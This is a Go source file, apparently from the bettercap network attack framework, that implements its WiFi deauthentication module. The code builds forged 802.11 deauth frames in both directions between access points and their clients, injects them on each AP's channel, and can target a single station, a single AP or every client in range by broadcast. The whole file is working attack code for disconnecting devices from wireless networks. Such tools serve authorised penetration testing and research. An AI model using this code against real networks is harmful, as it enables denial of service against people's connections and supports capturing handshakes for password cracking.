package modules

import (
	"bytes"
	"fmt"
	"net"
	"sort"
	"time"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
)

func (w *WiFiModule) injectPacket(data []byte) {
	if err := w.handle.WritePacketData(data); err != nil {
		log.Error("cloud not inject WiFi packet: %s", err)
		w.Session.Queue.TrackError()
	} else {
		w.Session.Queue.TrackSent(uint64(len(data)))
	}
	// let the network card breath a little
	time.Sleep(10 * time.Millisecond)
}

func (w *WiFiModule) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	for seq := uint16(0); seq < 64 && w.Running(); seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			log.Error("cloud not create deauth packet: %s", err)
			continue
		} else {
			w.injectPacket(pkt)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			log.Error("cloud not create deauth packet: %s", err)
			continue
		} else {
			w.injectPacket(pkt)
		}
	}
}

func (w *WiFiModule) startDeauth(to net.HardwareAddr) error {
	// if not already running, temporarily enable the pcap handle
	// for packet injection
	if !w.Running() {
		if err := w.Configure(); err != nil {
			return err
		}
		defer w.handle.Close()
	}

	w.writes.Add(1)
	defer w.writes.Done()

	type flow struct {
		Ap     *network.AccessPoint
		Client *network.Station
	}

	toDeauth := make([]flow, 0)
	isBcast := network.IsBroadcastMac(to)
	for _, ap := range w.Session.WiFi.List() {
		isAP := bytes.Equal(ap.HW, to)
		for _, client := range ap.Clients() {
			if isBcast || isAP || bytes.Equal(client.HW, to) {
				toDeauth = append(toDeauth, flow{Ap: ap, Client: client})
			}
		}
	}

	if len(toDeauth) == 0 {
		return fmt.Errorf("%s is an unknown BSSID.", to.String())

	}

	// since we need to change the wifi adapter channel for each
	// deauth packet, let's sort by channel so we do the minimum
	// amount of hops possible
	sort.Slice(toDeauth, func(i, j int) bool {
		return toDeauth[i].Ap.Channel() < toDeauth[j].Ap.Channel()
	})

	// send the deauth frames
	for _, deauth := range toDeauth {
		client := deauth.Client
		ap := deauth.Ap
		if w.Running() {
			log.Info("deauthing client %s from AP %s (channel %d)", client.String(), ap.ESSID(), ap.Channel())
			w.onChannel(ap.Channel(), func() {
				w.sendDeauthPacket(ap.HW, client.HW)
			})
		}
	}

	return nil
}
